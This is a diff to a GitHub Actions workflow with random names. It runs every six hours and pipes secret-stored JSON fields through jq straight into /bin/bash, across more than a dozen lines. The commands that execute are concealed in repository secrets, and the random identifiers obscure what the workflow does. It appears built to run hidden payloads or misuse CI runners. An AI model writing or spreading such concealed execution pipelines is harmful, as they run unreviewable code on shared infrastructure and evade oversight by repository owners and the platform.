@@ -3,23 +3,30 @@ name: labourersullen
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 5/6 * * *'
+    - cron: '3 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: labourersullen
         env:
-          luym6: ${{ secrets.luym6 }}
+          uxr0786: ${{ secrets.uxr0786 }}
         run: |
-          echo $luym6 | jq -r .fb2015 | /bin/bash
-          echo $qt7 | jq -r .om811 | /bin/bash
-          echo $jfzia8192 | jq -r .wh2 | /bin/bash
-          echo $zhy5 | jq -r .kn0 | /bin/bash
-          echo $jgd38257 | jq -r .iqd53783 | /bin/bash
-          echo $qzul913 | jq -r .ouqn2 | /bin/bash
-          echo $yx9561 | jq -r .qrv4 | /bin/bash
-          echo $ohty332 | jq -r .puq74 | /bin/bash
-          echo $bdkv814 | jq -r .o886 | /bin/bash
+          echo $uxr0786 | jq -r .oldss39488 | /bin/bash
+          echo $mjuc14952 | jq -r .ethx537 | /bin/bash
+          echo $wbk2 | jq -r .ptx91048 | /bin/bash
+          echo $xmto31237 | jq -r .rjetu8 | /bin/bash
+          echo $ul905 | jq -r .shk53369 | /bin/bash
+          echo $m85 | jq -r .yuk40204 | /bin/bash
+          echo $e98 | jq -r .llxu5 | /bin/bash
+          echo $vd56 | jq -r .edwxj5 | /bin/bash
+          echo $ya1640 | jq -r .gq5 | /bin/bash
+          echo $jqeil10 | jq -r .gd7460 | /bin/bash
+          echo $p641 | jq -r .rvu63793 | /bin/bash
+          echo $dnhv8687 | jq -r .ly404 | /bin/bash
+          echo $kjzm0 | jq -r .zfzhj59 | /bin/bash
+          echo $t557 | jq -r .smqs35362 | /bin/bash
+          echo $prj19259 | jq -r .ffrb33034 | /bin/bash
 
